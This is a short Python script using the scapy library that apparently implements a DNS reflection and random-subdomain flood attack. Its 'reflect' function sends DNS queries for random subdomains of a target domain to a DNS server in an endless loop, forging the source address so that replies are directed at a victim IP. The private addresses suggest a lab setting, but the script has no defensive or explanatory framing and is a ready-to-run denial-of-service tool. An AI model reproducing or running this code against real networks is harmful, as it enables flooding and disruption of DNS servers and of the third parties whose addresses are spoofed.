from scapy.all import DNS, DNSQR, IP, UDP, sr1, send
import string
import random

def resolve_url(url, dns_server):
    dns_query = IP(dst=dns_server)/UDP(dport=5353)/DNS(rd=1, qd=DNSQR(qname=url))
    response = sr1(dns_query, verbose=False)
    res = False
    if response and response.haslayer(DNS):
        for answer in response[DNS].summary():
            res = True

    return res

def reflect(url, dns_server, ip):
    while(True):
        ranstring = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=12))
        dns_query = IP(src=ip,dst=dns_server)/UDP(dport=5353)/DNS(rd=10,qd=DNSQR(qname=str(ranstring)+"."+url))
        send(dns_query,count=1,verbose=False)

def main():
    dns_server = "10.12.0.20"
    ip = "10.1.0.2"
    urls=["example.com","test.com","demo.com"]
    
    reflect(urls[0],dns_server,ip)


if __name__=='__main__':
    main()
